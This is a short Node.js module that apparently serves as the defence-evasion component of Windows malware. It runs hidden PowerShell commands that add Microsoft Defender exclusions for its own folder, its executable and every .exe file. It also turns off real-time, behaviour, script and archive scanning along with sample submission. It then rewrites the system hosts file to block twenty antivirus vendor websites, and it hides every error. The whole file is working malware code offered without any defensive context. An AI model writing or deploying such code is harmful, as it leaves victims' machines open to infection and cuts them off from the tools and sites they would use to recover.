const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

const BLOCKED_SITES = [
    "ccleaner.com", "emsisoft.com", "f-secure.com", "zonealarm.com", "trendmicro.com",
    "pcprotect.com", "mcafee.com", "bitdefender.com", "sophos.com", "clamav.net",
    "drweb.com", "norton.com", "kaspersky.com", "avast.com", "avg.com",
    "malwarebytes.com", "eset.com", "totalav.com", "scanguard.com", "adaware.com"
];

const runCommand = (cmd) => {
    return new Promise((resolve) => {
        exec(cmd, { windowsHide: true }, () => resolve());
    });
};

const ExcludeFromDefender = async () => {
    const exePath = process.execPath;
    const folderPath = process.cwd();
    await runCommand(`powershell -Command "Add-MpPreference -ExclusionPath '${folderPath}'"`);
    await runCommand(`powershell -Command "Add-MpPreference -ExclusionPath '${exePath}'"`);
    await runCommand(`powershell -Command "Add-MpPreference -ExclusionExtension '.exe'"`);
};

const DisableDefender = async () => {
    const commands = [
        `powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableArchiveScanning $true -DisableBehaviorMonitoring $true"`,
        `powershell -Command "Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 0"`,
        `powershell -Command "Set-MpPreference -EnableControlledFolderAccess Disabled"`
    ];
    for (const cmd of commands) await runCommand(cmd);
};

const BlockSites = async () => {
    try {
        const hostsPath = path.join(process.env.SYSTEMROOT || 'C:\\Windows', 'System32', 'drivers', 'etc', 'hosts');
        let content = fs.existsSync(hostsPath) ? fs.readFileSync(hostsPath, 'utf8') : '';
        for (const site of BLOCKED_SITES) {
            const line1 = `0.0.0.0 ${site}`;
            const line2 = `0.0.0.0 www.${site}`;
            if (!content.includes(line1)) content += `\n${line1}`;
            if (!content.includes(line2)) content += `\n${line2}`;
        }
        fs.writeFileSync(hostsPath, content.trim() + '\n');
    } catch (e) {}
};

module.exports = async () => {
    try {
        await ExcludeFromDefender();
        await DisableDefender();
        await BlockSites();
    } catch (error) {}
};

